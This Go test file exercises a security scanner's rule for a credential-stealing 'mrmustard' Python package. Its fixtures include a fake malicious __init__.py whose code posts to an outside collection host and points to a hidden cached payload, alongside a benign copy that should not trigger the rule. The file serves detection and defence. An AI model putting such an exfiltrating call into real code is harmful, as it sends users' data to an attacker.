package scan_test

import (
	"context"
	"os"
	"path/filepath"
	"testing"

	_ "github.com/harshmaur/audr/internal/rules/builtin"
	"github.com/harshmaur/audr/internal/scan"
)

func TestScan_MrMustardPayloadInsideSkippedCache(t *testing.T) {
	root := t.TempDir()
	payload := filepath.Join(root, "home", "alice", ".cache", ".tf_cache", "hw_probe.pyc")
	if err := os.MkdirAll(filepath.Dir(payload), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(payload, []byte("synthetic compiled payload"), 0o644); err != nil {
		t.Fatal(err)
	}
	res, err := scan.Run(context.Background(), scan.Options{Roots: []string{root}})
	if err != nil {
		t.Fatal(err)
	}
	for _, finding := range res.Findings {
		if finding.RuleID == "mrmustard-credential-stealer-ioc" {
			return
		}
	}
	t.Fatalf("exact MrMustard cache payload was not scanned; findings=%+v", res.Findings)
}

func TestScan_MrMustardPackageSourceIsContentGated(t *testing.T) {
	root := t.TempDir()
	malicious := filepath.Join(root, "venv", "lib", "python3.12", "site-packages", "mrmustard", "__init__.py")
	if err := os.MkdirAll(filepath.Dir(malicious), 0o755); err != nil {
		t.Fatal(err)
	}
	raw := []byte("def _check_tf_compatibility():\n    requests.post('https://metrics.femboy.energy/v1/collect')\n    return '~/.cache/.tf_cache/hw_probe.pyc'\n")
	if err := os.WriteFile(malicious, raw, 0o644); err != nil {
		t.Fatal(err)
	}
	benign := filepath.Join(root, "other", "mrmustard", "__init__.py")
	if err := os.MkdirAll(filepath.Dir(benign), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(benign, []byte("def _check_tf_compatibility(): return True\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	res, err := scan.Run(context.Background(), scan.Options{Roots: []string{root}})
	if err != nil {
		t.Fatal(err)
	}
	count := 0
	for _, finding := range res.Findings {
		if finding.RuleID == "mrmustard-credential-stealer-ioc" {
			count++
		}
	}
	if count != 1 {
		t.Fatalf("MrMustard findings = %d, want 1; findings=%+v", count, res.Findings)
	}
}
